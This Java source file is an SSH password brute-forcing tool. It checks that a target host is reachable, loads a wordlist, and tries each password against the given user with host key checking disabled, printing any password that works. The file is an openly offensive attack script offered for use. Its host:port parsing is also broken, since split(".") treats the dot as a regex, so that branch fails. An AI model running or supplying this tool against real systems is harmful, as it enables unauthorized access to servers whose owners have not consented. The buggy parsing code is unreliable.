import java.net.Socket;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.io.FileReader;
import java.io.BufferedReader;
import com.jcraft.jsch.*;

public class ssh_bruteforce {
	public static void checkHost(String host, int port) {
		try {
			System.out.print("check if host is alive");
			Socket checkSock = new Socket();
			checkSock.connect(new InetSocketAddress(host, port), 1000);
			checkSock.close();
			System.out.println("success");
		} catch (Exception e) {
			System.out.println("fail");
			System.exit(1);
		}
	}

	// Read a file line by line and put result in array variable
	public static ArrayList<String> getWordlist(String path) {
		System.out.print("reading wordlist");
		ArrayList<String> wordlist = new ArrayList<String>();
		try {
			BufferedReader buffRead = new BufferedReader(new FileReader(path));
			String line = null;
			while ((line = buffRead.readLine()) != null) {
				wordlist.add(line);
			}
			buffRead.close();
			System.out.println("done");
		} catch (Exception e) {
			System.out.println("fail");
			System.exit(1);
		}
		return wordlist;
	}

	public static boolean crackPass(String host, String user, String pass, int port) {
		try {
			Session tryPass = new JSch().getSession(user, host, port);
			tryPass.setPassword(pass);
			tryPass.setConfig("StrictHostKeyChecking", "no");
			tryPass.connect(30000);
			tryPass.disconnect();
		} catch (Exception e) {
			return false;
		}
		return true;
	}


	public static void main(String args[]) {
		if (args.length != 3) {
			System.out.println("usage: ./ssh_bruteforce [TARGET[:PORT]] [USERNAME] [WORDLIST]");
			System.exit(1);
		}
		String targetIP;
		int targetPort;
		if (args[0].contains(":")) {
			targetIP = args[0].split(".")[0];
			targetPort = Integer.parseInt(args[0].split(":")[1]);
		} else {
			targetIP = args[0];
			targetPort = 22;
		}

		checkHost(targetIP, targetPort);
		String user = args[1];
		ArrayList<String> wordlist = getWordlist(args[2]);
		System.out.println(String.format("cracking SSH password for \"%s\" at %s...\n", user, targetIP));
		for (int i=0; i < wordlist.size(); i++) {
			if (crackPass(targetIP, user, wordlist.get(i), targetPort)) {
				System.out.println("password found:");
				System.out.println(String.format("\tuser: %s", user));
				System.out.println(String.format("\tpass: %s", wordlist.get(i)));
				System.exit(0);
			}
		}
		System.out.println("bruteforce failed");
		System.exit(0);
	}
}
